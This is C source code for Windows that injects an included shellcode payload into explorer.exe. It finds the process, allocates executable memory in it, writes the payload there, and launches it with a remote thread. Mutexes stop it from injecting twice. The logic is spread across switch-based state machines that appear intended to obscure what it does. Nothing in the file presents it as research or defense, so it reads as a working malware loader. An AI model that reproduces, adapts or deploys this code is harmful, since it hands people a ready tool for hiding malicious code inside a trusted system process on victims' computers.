#define _WIN32_IE 0x0400

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <shlobj.h>

#include <tlhelp32.h>
#include "Shellcode.inc"

#define MAX_FILEPATH	255

#define KEY "Password"

bool DirectoryExists(const char *DirectoryPath)
{
	DWORD Attr = GetFileAttributes(DirectoryPath);
	return ((Attr != 0xFFFFFFFF) && ((Attr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY));
}

char *StrChar(const char *p, int ch)
{
	union {
		const char *cp;
		char *p;
	} u;
	u.cp = p;
	for (;; ++u.p)
	{
		if (*u.p == ch) return u.p;
		if (*u.p == '\0') return NULL;
	}
}

bool ForceDirectories(const char *Path)
{
	char *pp, *sp, PathCopy[1024];
	if (strlen(Path) >= sizeof(PathCopy)) return false;
	strncpy(PathCopy, Path, sizeof(PathCopy));

	char Delimiter = '\\';

	bool Created = true;
	pp = PathCopy;
	while (Created && (sp = StrChar(pp, Delimiter)) != NULL)
	{
		if (sp != pp)
		{
			*sp = '\0';
			if (!DirectoryExists(PathCopy)) Created = CreateDirectory(PathCopy, NULL);
			*sp = Delimiter;
		}
		pp = sp + 1;
	}
	return Created;
}



char CharToUpper(char c)
{
	return ((c < 123 && c > 96) ? (c - 32) : c);
}

int StrCaseCompare(char *Str1, char *Str2)
{
	if (Str1 == NULL || Str2 == NULL) return -1;
	char *s1 = Str1, *s2 = Str2;
	
	while (*s1 != '\0' && *s2 != '\0')
	{
		if (CharToUpper(*s1++) != CharToUpper(*s2++)) return -1;
	}
	if (*s1 != *s2) return -1;
	else return 0;
}

DWORD GetProcessIdFromName(char *ProcessName)
{
    PROCESSENTRY32 ProcessEntry;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hProcessSnap == INVALID_HANDLE_VALUE) return 0;

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	if (!Process32First(hProcessSnap, &ProcessEntry))
    {
        CloseHandle(hProcessSnap);          // clean the snapshot object
		return 0;
    }

    do
    {
		if (StrCaseCompare(ProcessName, ProcessEntry.szExeFile) == 0)
        {
            CloseHandle(hProcessSnap);
			return ProcessEntry.th32ProcessID;
        }
	}
	while (Process32Next(hProcessSnap, &ProcessEntry));
	CloseHandle (hProcessSnap);
	return 0;     
}

HANDLE InjectShellcode(HANDLE hProcess, unsigned char* Shellcode, int ShellcodeLen)
{
	enum State {
		ALLOCATE_MEMORY,
		WRITE_SHELLCODE,
		CREATE_REMOTE_THREAD,
		RETURN_RESULT
	};

	State state = ALLOCATE_MEMORY;
	DWORD BytesWritten, TID;
	LPVOID pThread = nullptr;
	HANDLE ThreadHandle = nullptr;

	while (state != RETURN_RESULT) {
		switch (state) {
		case ALLOCATE_MEMORY:
			pThread = VirtualAllocEx(hProcess, NULL, ShellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (pThread != NULL) {
				state = WRITE_SHELLCODE;
			}
			else {
				state = RETURN_RESULT;
			}
			break;

		case WRITE_SHELLCODE:
			if (WriteProcessMemory(hProcess, pThread, Shellcode, ShellcodeLen, &BytesWritten)) {
				state = CREATE_REMOTE_THREAD;
			}
			else {
				state = RETURN_RESULT;
			}
			break;

		case CREATE_REMOTE_THREAD:
			ThreadHandle = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pThread, NULL, 0, &TID);
			state = RETURN_RESULT;
			break;

		case RETURN_RESULT:
			// End state
			break;
		}
	}

	return ThreadHandle;
}


bool ShellcodeInjected()
{
	enum State {
		OPEN_MUTEX,
		RETURN_RESULT
	};

	State state = OPEN_MUTEX;
	HANDLE hMutex = nullptr;
	bool result = false;

	while (state != RETURN_RESULT) {
		switch (state) {
		case OPEN_MUTEX:
			hMutex = OpenMutex(MUTEX_ALL_ACCESS, false, "SHELLCODE_MUTEX");
			if (hMutex == NULL) {
				result = false;
			}
			else {
				CloseHandle(hMutex);
				result = true;
			}
			state = RETURN_RESULT;
			break;

		case RETURN_RESULT:
			// End state
			break;
		}
	}

	return result;
}


void InitiateMonitoringThread()
{
	enum State {
		CREATE_MUTEX,
		CHECK_SHELLCODE_INJECTED,
		GET_PROCESS_ID,
		OPEN_PROCESS,
		INJECT_SHELLCODE,
		RETURN_RESULT
	};

	State state = CREATE_MUTEX;
	HANDLE hProcess = nullptr;
	DWORD ProcessId;
	bool shellcodeInjected = false;

	while (state != RETURN_RESULT) {
		switch (state) {
		case CREATE_MUTEX:
			CreateMutex(NULL, 0, "7YhngylKo09H");
			state = CHECK_SHELLCODE_INJECTED;
			break;

		case CHECK_SHELLCODE_INJECTED:
			shellcodeInjected = ShellcodeInjected();
			if (!shellcodeInjected) {
				state = GET_PROCESS_ID;
			}
			else {
				state = RETURN_RESULT;
			}
			break;

		case GET_PROCESS_ID:
			ProcessId = GetProcessIdFromName("explorer.exe");
			state = OPEN_PROCESS;
			break;

		case OPEN_PROCESS:
			hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, ProcessId);
			if (hProcess != nullptr) {
				state = INJECT_SHELLCODE;
			}
			else {
				state = RETURN_RESULT;
			}
			break;

		case INJECT_SHELLCODE:
			InjectShellcode(hProcess, mthread, sizeof(mthread));
			state = RETURN_RESULT;
			break;

		case RETURN_RESULT:
			// End state
			break;
		}
	}
}
